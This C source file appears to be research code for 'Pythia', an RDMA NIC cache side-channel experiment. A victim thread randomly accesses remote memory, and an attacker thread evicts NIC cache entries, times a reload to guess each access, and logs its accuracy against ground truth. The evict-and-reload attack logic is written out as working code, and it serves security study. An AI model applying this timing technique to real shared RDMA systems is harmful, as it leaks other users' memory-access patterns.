#include "memcached.h"
#include "client.h"
#define DBG_STRING "client"
#define RSEC_ROLE CLIENT

/**
 * client.c: this code is for client/attacker.
 * Since attackers and clients have the same privilege, I used the same code to
 * build connections.
 */
struct configuration_params *param_arr;
pthread_t *thread_arr;
pthread_barrier_t local_barrier;
struct ib_inf *node_share_inf;

/**
 * run_client - initialize client function and issue requests to setup
 * connections
 * @arg: input parameter
 */
void *run_client(void *arg) {
    int i;
    struct configuration_params *input_arg = arg;
    int machine_id = input_arg->machine_id;
    int num_threads = input_arg->total_threads;
    int num_servers = input_arg->num_servers;
    int num_clients = input_arg->num_clients;
    int base_port_index = input_arg->base_port_index;
    int ret;
    param_arr = malloc(num_threads * sizeof(struct configuration_params));
    thread_arr = malloc(num_threads * sizeof(pthread_t));
    // initialize barrier
    ret = pthread_barrier_init(&local_barrier, NULL, input_arg->total_threads);
    if (ret)
        die_printf("[%s] fail to create barrier %d thread %d\n", __func__, ret,
                   input_arg->total_threads);

    // initialize thread
    for (i = num_threads - 1; i >= 0; i--) {
        param_arr[i].global_thread_id = (machine_id << RSEC_ID_SHIFT) + i;
        param_arr[i].local_thread_id = i;
        param_arr[i].base_port_index = base_port_index;
        param_arr[i].num_servers = num_servers;
        param_arr[i].num_clients = num_clients;
        param_arr[i].machine_id = machine_id;
        param_arr[i].total_threads = num_threads;
        param_arr[i].device_id = input_arg->device_id;
        param_arr[i].num_loopback = input_arg->num_loopback;
        param_arr[i].interaction_mode = input_arg->interaction_mode;
        if (input_arg->machine_id != 1)
            param_arr[i].num_attack_qps = RSEC_ATTACK_QP_NUMBER;
        else
            param_arr[i].num_attack_qps = 0;
        if (i != 0)
            pthread_create(&thread_arr[i], NULL, main_client, &param_arr[i]);
        else
            main_client(&param_arr[0]);
    }
    return NULL;
}

/**
 * main_client - finish all InfiniBand/RDMA connection setup, regular clients
 * and attackers are separated from this function
 * @arg: input parameter
 */
void *main_client(void *arg) {
    // int machine_id, thread_id;
    struct configuration_params *input_arg = arg;
    struct ib_local_inf *node_private_inf;
    node_share_inf = ib_complete_setup(input_arg, RSEC_ROLE, DBG_STRING);
    assert(node_share_inf != NULL);
    node_private_inf = ib_local_setup(input_arg, node_share_inf);
    printf("finish all client setup\n");
    if (input_arg->machine_id == 1)
        client_code(node_share_inf, node_private_inf, input_arg);
    else
        attacker_code(node_share_inf, node_private_inf, input_arg);
    printf("ready to press ctrl+c to finish experiment\n");
    while (1)
        ;
}

/**
 * client_code - major code client is running in Pythia
 * 1. wait a timewindow to let attacker issue evict
 * 2. issue request or sleep (no request)
 * 3. tell attacker the request has been made (attacker doesn't know whether the
 * client performs a request or not)
 * @global_inf: RDMA context
 * @local_inf: RDMA context-subset
 * @input_arg: input parameter
 */
void client_code(struct ib_inf *global_inf, struct ib_local_inf *local_inf,
                 struct configuration_params *input_arg) {
    /* write your code here */
    GArray *rsec_malloc_array;
    rsec_malloc_array = g_array_new(FALSE, FALSE, sizeof(guint64));
    char *temp = rsec_malloc(RSEC_MR_SIZE, rsec_malloc_array);
    char *memcached_string = malloc(RSEC_MEMCACHED_STRING_LENGTH);
    struct ibv_mr *temp_mr =
        ibv_reg_mr(node_share_inf->pd, temp, RSEC_MR_SIZE,
                   IBV_ACCESS_LOCAL_WRITE | IBV_ACCESS_REMOTE_WRITE |
                       IBV_ACCESS_REMOTE_READ);
    int i;
    int running_times;
    unsigned long *signal_output = malloc(sizeof(unsigned long));
    unsigned long *signal_input;
    int target;

    char access_set_name[RSEC_MAX_QP_NAME];
    int *access_set;
    int ret_len;

    FILE *fp_key;
    int *key_array;
    struct timespec current, start;

    struct ib_mr_attr *mr_list, **access_mr_list, *tmp_mr_list;
    if (RSEC_RELOAD_VPN_FILE) {
        key_array = malloc(sizeof(int) * RSEC_RELOAD_VPN_LENGTH);
        fp_key = fopen(RSEC_RELOAD_VPN_FILE, "r");
        assert(key_array);
        assert(fp_key);
        for (i = 0; i < RSEC_RELOAD_VPN_LENGTH; i++) {
            fscanf(fp_key, "%d", &key_array[i]);
        }
    } else
        key_array = NULL;

    srand(RSEC_CLIENT_RAND_KEY);

    mr_list = malloc(sizeof(struct ib_mr_attr) * RSEC_MR_NUMBER);
    {
        char mem_mr_name[RSEC_MAX_QP_NAME];
        sprintf(mem_mr_name, "mr-key");
        do {
            ret_len =
                memcached_get_published(mem_mr_name, (void **)&tmp_mr_list);
        } while (ret_len <= 0);
        // assert(ret_len == sizeof(struct ib_mr_attr) * RSEC_MR_NUMBER);
        assert(ret_len == sizeof(struct ib_mr_attr));
        for (i = 0; i < RSEC_MR_NUMBER; i++) {
            mr_list[i].addr = tmp_mr_list->addr +
                              (unsigned long long)i * RSEC_REAL_BLOCK_SIZE;
            mr_list[i].rkey = tmp_mr_list->rkey;
        }
    }
    RSEC_PRINT("get all mr %lld\n", RSEC_MR_NUMBER);

    sprintf(access_set_name, RSEC_ACCESS_SET_STRING);
    do {
        ret_len =
            memcached_get_published(access_set_name, (void **)&access_set);
    } while (ret_len <= 0);
    assert(ret_len == sizeof(int) * RSEC_ACCESS_MR_RANGE);

    // experiment start
    // stick_this_thread_to_core(2);
    clock_gettime(CLOCK_MONOTONIC, &start);
    for (running_times = 0; running_times < RSEC_ACCESS_TEST_RUNNING_TIMES;
         running_times++) {
        int access_target;
        access_target = get_access_target(running_times, key_array);
        if (running_times % 100 == 0) {
            clock_gettime(CLOCK_MONOTONIC, &current);
            RSEC_PRINT("%d/%d - uses %ld seconds\n", running_times,
                       RSEC_ACCESS_TEST_RUNNING_TIMES,
                       current.tv_sec - start.tv_sec);
        }
        access_mr_list = rsec_form_sub_mr(&mr_list[access_target],
                                          RSEC_ACCESS_MR_RANGE, NULL);
        // RSEC_PRINT("Experiment start-%d\n", running_times);

        rsec_get_threshold(node_share_inf->conn_cq[RSEC_SERVER_QP_NUM],
                           node_share_inf->conn_qp[RSEC_SERVER_QP_NUM], NULL,
                           NULL, temp_mr,
                           access_mr_list[RSEC_EXP_MODE_CACHE_TARGET], NULL, 0,
                           NULL, NULL, 0, running_times);
        // RSEC_PRINT("finish threshold-%d\n", running_times);
        RSEC_PRINT(
            "%d-TARGET == rkey: %ld addr: %llx\n", running_times,
            (long int)access_mr_list[RSEC_EXP_MODE_CACHE_TARGET]->rkey,
            (long long int)access_mr_list[RSEC_EXP_MODE_CACHE_TARGET]->addr);
        for (i = 0; i < RSEC_ACCESS_TEST_TIME; i++) {
            // wait for access signal
            memset(memcached_string, 0, RSEC_MEMCACHED_STRING_LENGTH);
            sprintf(memcached_string, RSEC_EVICT_STRING, running_times, i);
            signal_input = memcached_get_published_size(memcached_string,
                                                        RSEC_SIGNAL_SIZE);
            if (*signal_input != i)
                RSEC_PRINT("%d:%d\n", (int)*signal_input, i);
            // access

            if (input_arg->interaction_mode) {
                printf("input target parameter: 0~%d: ",
                       RSEC_ACCESS_MR_RANGE - 1);
                scanf("%d", &target);
            }
            switch (RSEC_EXP_MODE) {
                case RSEC_EXP_MODE_CACHE:
                    target = rand() % 2;  // access or not
                    if (target == RSEC_EXP_MODE_CACHE_TARGET)
                        rsec_access_mr(
                            node_share_inf->conn_cq[RSEC_SERVER_QP_NUM],
                            node_share_inf->conn_qp[RSEC_SERVER_QP_NUM],
                            temp_mr, &access_mr_list[target],
                            RSEC_ACCESS_MR_NUMBER);
                    break;
            }

            // submit access signal
            memset(memcached_string, 0, RSEC_MEMCACHED_STRING_LENGTH);
            sprintf(memcached_string, RSEC_ACCESS_STRING, running_times, i);
            *signal_output = target;
            memcached_publish(memcached_string, signal_output,
                              RSEC_SIGNAL_SIZE);
        }
    }
    memset(memcached_string, 0, RSEC_MEMCACHED_STRING_LENGTH);
    sprintf(memcached_string, RSEC_TERMINATE_STRING, input_arg->machine_id);
    memcached_publish(memcached_string, &input_arg->machine_id, sizeof(int));
    free(memcached_string);
}

char file_name[64];
FILE *create_log(void);
/**
 * create_log - log creating function
 * 1. backup all configuration
 * 2. setup log
 */
FILE *create_log(void) {
    char header_command[128], source_command[128], control_command[128];
    long unsigned int current_time = (unsigned long)time(NULL);
    sprintf(file_name, "microbenchmark-%lu.log", current_time);
    sprintf(header_command, "cp rsec.h microbenchmark-%lu.rsec.h",
            current_time);
    sprintf(source_command,
            "cp rsec.c microbenchmark-%lu.rsec.c;cp client.c "
            "microbenchmark-%lu.client.c",
            current_time, current_time);
    sprintf(control_command,
            "cp rsec_control.c microbenchmark-%lu.rsec_control.c",
            current_time);
    FILE *fp = fopen(file_name, "w");
    system(header_command);
    system(source_command);
    system(control_command);
    RSEC_PRINT("running at %s\n", file_name);
    return fp;
}

void close_log(FILE *fp);
/**
 * close_log - log function
 * close file
 */
void close_log(FILE *fp) {
    fclose(fp);
    RSEC_PRINT("running at %s\n", file_name);
    return;
}

/**
 * attacker_code - major code client is running in Pythia
 * 1. issue evict to clean RDMA NIC cache
 * 2. wait for the notification from client
 * 3. reload the entry and measure the running time/latency to tell whether the
 * client issues a request or not
 * 4. check the answer and get the accuracy
 * @global_inf: RDMA context
 * @local_inf: RDMA context-subset
 * @input_arg: input parameter
 */
void attacker_code(struct ib_inf *global_inf, struct ib_local_inf *local_inf,
                   struct configuration_params *input_arg) {
    /* write your code here */
    GArray *rsec_malloc_array;
    rsec_malloc_array = g_array_new(FALSE, FALSE, sizeof(guint64));
    char *temp = rsec_malloc(RSEC_MR_SIZE, rsec_malloc_array);
    // char *temp = malloc(1024);
    char *memcached_string = malloc(RSEC_MEMCACHED_STRING_LENGTH);
    struct ibv_mr *temp_mr =
        ibv_reg_mr(node_share_inf->pd, temp, RSEC_MR_SIZE,
                   IBV_ACCESS_LOCAL_WRITE | IBV_ACCESS_REMOTE_WRITE |
                       IBV_ACCESS_REMOTE_READ);
    int i;
    int running_times;
    int answer, count = 0;
    unsigned long *signal_output = malloc(sizeof(unsigned long));
    unsigned long *signal_input;
    struct ib_mr_attr *mr_list, *evict_mr_list, *probe_mr_list, *tmp_mr_list;
    struct ib_mr_attr **reload_mr_list, **sub_evict_mr_list;
    int *evict_mr_order = malloc(sizeof(int) * RSEC_EVICT_MR_NUMBER);
    int *reload_mr_order = malloc(sizeof(int) * RSEC_RELOAD_MR_NUMBER);
    uint32_t *extra_rkey;

    char access_set_name[RSEC_MAX_QP_NAME];
    int *access_set;
    int ret_len;

    FILE *fp = create_log();
    //FILE *fp_each_log = fopen("each_time.log", "w");

    FILE *fp_key;
    int *key_array;

    mr_list = malloc(sizeof(struct ib_mr_attr) * RSEC_MR_NUMBER);
    {
        char mem_mr_name[RSEC_MAX_QP_NAME];
        sprintf(mem_mr_name, "mr-key");
        do {
            ret_len =
                memcached_get_published(mem_mr_name, (void **)&tmp_mr_list);
        } while (ret_len <= 0);
        // assert(ret_len == sizeof(struct ib_mr_attr) * RSEC_MR_NUMBER);
        assert(ret_len == sizeof(struct ib_mr_attr));
        for (i = 0; i < RSEC_MR_NUMBER; i++) {
            mr_list[i].addr = tmp_mr_list->addr +
                              (unsigned long long)i * RSEC_REAL_BLOCK_SIZE;
            mr_list[i].rkey = tmp_mr_list->rkey;
        }
    }
    RSEC_PRINT("get all mr %lld\n", RSEC_MR_NUMBER);

    {
        char mem_mr_name[RSEC_MAX_QP_NAME];
        sprintf(mem_mr_name, "evict-mr-key");
        do {
            ret_len =
                memcached_get_published(mem_mr_name, (void **)&evict_mr_list);
        } while (ret_len <= 0);
        assert(ret_len == sizeof(struct ib_mr_attr) * RSEC_EVICT_MR_NUMBER);
    }
    RSEC_PRINT("get evict mr %d\n", RSEC_EVICT_MR_NUMBER);
    probe_mr_list = mr_list;

    {
        char mem_mr_name[RSEC_MAX_QP_NAME];
        sprintf(mem_mr_name, RSEC_EXTRA_MR_STRING);
        do {
            ret_len =
                memcached_get_published(mem_mr_name, (void **)&extra_rkey);
        } while (ret_len <= 0);
        assert(ret_len == sizeof(uint32_t) * RSEC_EXTRA_MR);
    }
    RSEC_PRINT("get extra rkey %d\n", RSEC_EXTRA_MR);

    sprintf(access_set_name, RSEC_ACCESS_SET_STRING);
    do {
        ret_len =
            memcached_get_published(access_set_name, (void **)&access_set);
    } while (ret_len <= 0);
    assert(ret_len == sizeof(int) * RSEC_ACCESS_MR_RANGE);

    if (RSEC_RELOAD_VPN_FILE) {
        key_array = malloc(sizeof(int) * RSEC_RELOAD_VPN_LENGTH);
        fp_key = fopen(RSEC_RELOAD_VPN_FILE, "r");
        assert(key_array);
        assert(fp_key);
        for (i = 0; i < RSEC_RELOAD_VPN_LENGTH; i++) {
            fscanf(fp_key, "%d", &key_array[i]);
        }
    } else
        key_array = NULL;

    for (i = 0; i < RSEC_EVICT_MR_NUMBER; i++) evict_mr_order[i] = i;
    for (i = 0; i < RSEC_RELOAD_MR_NUMBER; i++) reload_mr_order[i] = i;

    // experiment start
    stick_this_thread_to_core(2);

    for (running_times = 0; running_times < RSEC_ACCESS_TEST_RUNNING_TIMES;
         running_times++) {
        int access_target = get_access_target(running_times, key_array);
        int shift = get_shift_target(access_target, running_times);
        int custom_stride_distance = get_stride_distance_target(running_times);
        int custom_evict_number = get_num_evict_target(running_times);
        uint32_t custom_rkey_choice = get_mr_target(running_times, extra_rkey);
        int custom_stride_strategy = get_stride_strategy(running_times);

        struct ibv_sge input_sge;
        // struct ibv_send_wr *wr;
        struct ibv_send_wr **input_wr_list;

        struct return_int log_index_set;
        log_index_set.index_distance = -1;
        log_index_set.real_distance = -1;
        log_index_set.first = -1;
        log_index_set.last = -1;

        reload_mr_list = rsec_form_sub_mr(&mr_list[access_target],
                                          RSEC_RELOAD_MR_NUMBER, access_set);
        RSEC_PRINT(
            "%d-TARGET == rkey: %ld addr: %llx\n", running_times,
            (long int)reload_mr_list[RSEC_EXP_MODE_CACHE_TARGET]->rkey,
            (long long int)reload_mr_list[RSEC_EXP_MODE_CACHE_TARGET]->addr);
        int test_mode;
        // int noise_bit = 0;

        double evict_lat;
        double total_evict_lat = 0;
        struct timespec start, end;
        int real_process_mr_number, total_wr_length;
        double lat_evict, lat_hit, lat_average, lat_reload;
        double thr_evict, thr_hit, sum_evict = 0, sum_hit = 0;
        int thr_flag;
        int per_wr;
        // int current_record = 0;
        // test_mode = PROBE_TEST_ARRAY[running_times];
        test_mode = get_evict_mode(running_times);
        real_process_mr_number = custom_evict_number;
        switch (test_mode) {
            case RSEC_PROBE_COLLISION_CHECK_MODE_MR:
                sub_evict_mr_list = rsec_form_attack_sub_mr(
                    reload_mr_list[RSEC_EXP_MODE_CACHE_TARGET]->rkey,
                    evict_mr_list, custom_evict_number, &real_process_mr_number,
                    RSEC_EVICT_MR_NUMBER, custom_stride_distance);
                break;
            case RSEC_PROBE_COLLISION_CHECK_MODE_PROBE:
            case RSEC_PROBE_COLLISION_CHECK_MODE_ALWAYS:
            case RSEC_PROBE_COLLISION_CHECK_MODE_UNIFORM:
            case RSEC_PROBE_COLLISION_CHECK_MODE_STRIDE:
                sub_evict_mr_list = rsec_form_attack_sub_mr_new(
                    probe_mr_list, custom_evict_number, RSEC_MR_NUMBER,
                    test_mode, &real_process_mr_number, shift, access_target,
                    &log_index_set, custom_stride_distance, custom_rkey_choice,
                    custom_stride_strategy);
                break;
            default:
                RSEC_ERROR("mode %d error\n", RSEC_PROBE_COLLISION_CHECK_MODE);
                assert(0);
        }

        total_wr_length = RSEC_ROUND_UP(real_process_mr_number, RSEC_CQ_DEPTH) /
                          RSEC_CQ_DEPTH;
        input_wr_list =
            rsec_form_wr_list(temp_mr, sub_evict_mr_list, &input_sge,
                              real_process_mr_number, 0, 0);
        thr_flag = rsec_get_threshold(
            node_share_inf->conn_cq[RSEC_SERVER_QP_NUM],
            node_share_inf->conn_qp[RSEC_SERVER_QP_NUM],
            node_share_inf->conn_cq[RSEC_HELPER_QP_NUM],
            node_share_inf->conn_qp[RSEC_HELPER_QP_NUM], temp_mr,
            reload_mr_list[RSEC_EXP_MODE_CACHE_TARGET], input_wr_list,
            total_wr_length, &lat_evict, &lat_hit, 1, running_times);
        thr_evict = lat_evict;
        thr_hit = lat_hit;
        if (thr_flag == 1) {
            lat_evict = RSEC_ESTIMATED_EVICT_LATENCY;
            lat_hit = RSEC_ESTIMATED_HIT_LATENCY;
        }
        lat_average = (lat_evict + lat_hit) / 2;
        count = 0;
        answer = 0;
        for (i = 0; i < RSEC_ACCESS_TEST_TIME; i++) {
            // evict
            clock_gettime(CLOCK_MONOTONIC, &start);
            {
                for (per_wr = 0; per_wr < total_wr_length; per_wr++) {
                    userspace_one_preset(
                        node_share_inf->conn_qp[RSEC_HELPER_QP_NUM],
                        input_wr_list[per_wr]);
                    userspace_one_poll(
                        node_share_inf->conn_cq[RSEC_HELPER_QP_NUM], 1);
                }
            }
            clock_gettime(CLOCK_MONOTONIC, &end);
            evict_lat = diff_ns(&start, &end);
            total_evict_lat += evict_lat;
            // signal evict
            memset(memcached_string, 0, RSEC_MEMCACHED_STRING_LENGTH);
            sprintf(memcached_string, RSEC_EVICT_STRING, running_times, i);
            *signal_output = i;
            memcached_publish(memcached_string, signal_output,
                              RSEC_SIGNAL_SIZE);
            // wait for access signal
            memset(memcached_string, 0, RSEC_MEMCACHED_STRING_LENGTH);
            sprintf(memcached_string, RSEC_ACCESS_STRING, running_times, i);
            signal_input = memcached_get_published_size(memcached_string,
                                                        RSEC_SIGNAL_SIZE);
            // array_randomize(reload_mr_order, RSEC_RELOAD_MR_NUMBER);
            switch (RSEC_EXP_MODE) {
                case RSEC_EXP_MODE_CACHE:
                    clock_gettime(CLOCK_MONOTONIC, &start);
                    userspace_one_read(
                        node_share_inf->conn_qp[RSEC_SERVER_QP_NUM], temp_mr,
                        RSEC_RELOAD_MR_SIZE,
                        reload_mr_list[RSEC_EXP_MODE_CACHE_TARGET],
                        RSEC_RELOAD_MR_OFFSET);
                    userspace_one_poll(
                        node_share_inf->conn_cq[RSEC_SERVER_QP_NUM], 1);
                    clock_gettime(CLOCK_MONOTONIC, &end);
                    lat_reload = diff_ns(&start, &end);
                    // RSEC_PRINT("%d evict: %f - average %f\n", i, lat_reload,
                    // lat_average);
                    int my_answer = 0;
                    answer = 0;
                    if (lat_reload < lat_average)
                        my_answer = 0;
                    else
                        my_answer = 1;
                    if ((int)*signal_input == my_answer) answer = 1;
                    if ((int)*signal_input == 0)
                        sum_hit += lat_reload;
                    else
                        sum_evict += lat_evict;
                    //if (answer == 1)
                    //    RSEC_FPRINT(fp_each_log, "correct\t%d\t%f\n",
                    //                (int)*signal_input, lat_reload);
                    //else
                    //    RSEC_FPRINT(fp_each_log, "fail\t%d\t%f\n",
                    //                (int)*signal_input, lat_reload);
                    break;
            }
            if (answer) count++;
        }
        if (custom_evict_number == real_process_mr_number) {
            if (!thr_flag) {
                RSEC_PRINT(
                    "%d\t%d\tsuccess\t%s \t %0.2f\t%d/%d\tevict lat:\t%0.2f\t "
                    "%llx\t%lx\t%lx\t%0.2f(%0.2f-%0.2f)\t%0.2f(%0.2f-%0.2f)"
                    "\tindex:\t%ld\t%ld\t%ld\t%ld\t%d\n",
                    running_times, access_target,
                    rsec_experiment_evict_mode[test_mode],
                    ((float)count) / RSEC_ACCESS_TEST_TIME, count,
                    RSEC_ACCESS_TEST_TIME,
                    RSEC_NS_TO_US(total_evict_lat / RSEC_ACCESS_TEST_TIME),
                    (long long unsigned int)
                    reload_mr_list[RSEC_EXP_MODE_CACHE_TARGET]->addr,
                    (long unsigned int)
                    reload_mr_list[RSEC_EXP_MODE_CACHE_TARGET]->rkey,
                    (unsigned long)sub_evict_mr_list[0]->rkey, lat_evict,
                    thr_evict, sum_evict / RSEC_ACCESS_TEST_TIME, lat_hit,
                    thr_hit, sum_hit / RSEC_ACCESS_TEST_TIME,
                    log_index_set.first, log_index_set.last,
                    log_index_set.index_distance, log_index_set.real_distance,
                    real_process_mr_number);
                if (fp)
                    RSEC_FPRINT(
                        fp,
                        "%d\t%d\tsuccess\t%s \t %0.2f\t%d/%d\tevict "
                        "lat:\t%0.2f\t "
                        "%llx\t%lx\t%lx\t%0.2f(%0.2f-%0.2f)\t%0.2f(%0.2f-%0.2f)"
                        "\tindex:\t%ld\t%ld\t%ld\t%ld\t%d\n",
                        running_times, access_target,
                        rsec_experiment_evict_mode[test_mode],
                        ((float)count) / RSEC_ACCESS_TEST_TIME, count,
                        RSEC_ACCESS_TEST_TIME,
                        RSEC_NS_TO_US(total_evict_lat / RSEC_ACCESS_TEST_TIME),
                        (long long unsigned int)
                        reload_mr_list[RSEC_EXP_MODE_CACHE_TARGET]->addr,
                        (long unsigned int)
                        reload_mr_list[RSEC_EXP_MODE_CACHE_TARGET]->rkey,
                        (unsigned long)sub_evict_mr_list[0]->rkey, lat_evict,
                        thr_evict, sum_evict / RSEC_ACCESS_TEST_TIME, lat_hit,
                        thr_hit, sum_hit / RSEC_ACCESS_TEST_TIME,
                        log_index_set.first, log_index_set.last,
                        log_index_set.index_distance,
                        log_index_set.real_distance, real_process_mr_number);
            } else {
                RSEC_PRINT(
                    "%d\t%d\tfail\t%s \t %0.2f\t%d/%d\tevict lat:\t%0.2f\t "
                    "%llx\t%lx\t%lx\t%0.2f(%0.2f-%0.2f)\t%0.2f(%0.2f-%0.2f)"
                    "\tindex:\t%ld\t%ld\t%ld\t%ld\t%d\n",
                    running_times, access_target,
                    rsec_experiment_evict_mode[test_mode],
                    ((float)count) / RSEC_ACCESS_TEST_TIME, count,
                    RSEC_ACCESS_TEST_TIME,
                    RSEC_NS_TO_US(total_evict_lat / RSEC_ACCESS_TEST_TIME),
                    (long long unsigned int)(reload_mr_list
                                                 [RSEC_EXP_MODE_CACHE_TARGET]
                                                     ->addr),
                    (long unsigned int)
                    reload_mr_list[RSEC_EXP_MODE_CACHE_TARGET]->rkey,
                    (unsigned long)sub_evict_mr_list[0]->rkey, lat_evict,
                    thr_evict, sum_evict / RSEC_ACCESS_TEST_TIME, lat_hit,
                    thr_hit, sum_hit / RSEC_ACCESS_TEST_TIME,
                    log_index_set.first, log_index_set.last,
                    log_index_set.index_distance, log_index_set.real_distance,
                    real_process_mr_number);
                if (fp)
                    RSEC_FPRINT(
                        fp,
                        "%d\t%d\tfail\t%s \t %0.2f\t%d/%d\tevict lat:\t%0.2f\t "
                        "%llx\t%lx\t%lx\t%0.2f(%0.2f-%0.2f)\t%0.2f(%0.2f-%0.2f)"
                        "\tindex:\t%ld\t%ld\t%ld\t%ld\t%d\n",
                        running_times, access_target,
                        rsec_experiment_evict_mode[test_mode],
                        ((float)count) / RSEC_ACCESS_TEST_TIME, count,
                        RSEC_ACCESS_TEST_TIME,
                        RSEC_NS_TO_US(total_evict_lat / RSEC_ACCESS_TEST_TIME),
                        (long long unsigned int)
                        reload_mr_list[RSEC_EXP_MODE_CACHE_TARGET]->addr,
                        (long unsigned int)
                        reload_mr_list[RSEC_EXP_MODE_CACHE_TARGET]->rkey,
                        (unsigned long)sub_evict_mr_list[0]->rkey, lat_evict,
                        thr_evict, sum_evict / RSEC_ACCESS_TEST_TIME, lat_hit,
                        thr_hit, sum_hit / RSEC_ACCESS_TEST_TIME,
                        log_index_set.first, log_index_set.last,
                        log_index_set.index_distance,
                        log_index_set.real_distance, real_process_mr_number);
            }
        } else {
            RSEC_PRINT(
                "%d\t%d\tnotenough\t%s \t %0.2f\t%d/%d\tevict lat:\t%0.2f\t "
                "%llx\t%lx\t%lx\t%0.2f(%0.2f-%0.2f)\t%0.2f(%0.2f-%0.2f)\tindex:"
                "\t%ld\t%ld\t%ld\t%ld\t%d\n",
                running_times, access_target,
                rsec_experiment_evict_mode[test_mode],
                ((float)count) / RSEC_ACCESS_TEST_TIME, count,
                RSEC_ACCESS_TEST_TIME,
                RSEC_NS_TO_US(total_evict_lat / RSEC_ACCESS_TEST_TIME),
                (long long unsigned int)
                reload_mr_list[RSEC_EXP_MODE_CACHE_TARGET]->addr,
                (long unsigned int)reload_mr_list[RSEC_EXP_MODE_CACHE_TARGET]
                    ->rkey,
                (unsigned long)sub_evict_mr_list[0]->rkey, lat_evict, thr_evict,
                sum_evict / RSEC_ACCESS_TEST_TIME, lat_hit, thr_hit,
                sum_hit / RSEC_ACCESS_TEST_TIME, log_index_set.first,
                log_index_set.last, log_index_set.index_distance,
                log_index_set.real_distance, real_process_mr_number);
            if (fp)
                RSEC_FPRINT(
                    fp,
                    "%d\t%d\tnotenough\t%s \t %0.2f\t%d/%d\tevict "
                    "lat:\t%0.2f\t "
                    "%llx\t%lx\t%lx\t%0.2f(%0.2f-%0.2f)\t%0.2f(%0.2f-%0.2f)"
                    "\tindex:\t%ld\t%ld\t%ld\t%ld\t%d\n",
                    running_times, access_target,
                    rsec_experiment_evict_mode[test_mode],
                    ((float)count) / RSEC_ACCESS_TEST_TIME, count,
                    RSEC_ACCESS_TEST_TIME,
                    RSEC_NS_TO_US(total_evict_lat / RSEC_ACCESS_TEST_TIME),
                    (long long unsigned int)
                    reload_mr_list[RSEC_EXP_MODE_CACHE_TARGET]->addr,
                    (long unsigned int)
                    reload_mr_list[RSEC_EXP_MODE_CACHE_TARGET]->rkey,
                    (unsigned long)sub_evict_mr_list[0]->rkey, lat_evict,
                    thr_evict, sum_evict / RSEC_ACCESS_TEST_TIME, lat_hit,
                    thr_hit, sum_hit / RSEC_ACCESS_TEST_TIME,
                    log_index_set.first, log_index_set.last,
                    log_index_set.index_distance, log_index_set.real_distance,
                    real_process_mr_number);
        }

        if (sub_evict_mr_list) {
            free(sub_evict_mr_list[0]);
            free(sub_evict_mr_list);
        }
        if (input_wr_list) {
            for (i = 0; i < total_wr_length; i++) free(input_wr_list[i]);
            free(input_wr_list);
        }
    }
    memset(memcached_string, 0, RSEC_MEMCACHED_STRING_LENGTH);
    sprintf(memcached_string, RSEC_TERMINATE_STRING, input_arg->machine_id);
    memcached_publish(memcached_string, &input_arg->machine_id, sizeof(int));
    if (fp) close_log(fp);
    //if (fp_each_log) fclose(fp_each_log);
    free(memcached_string);
}
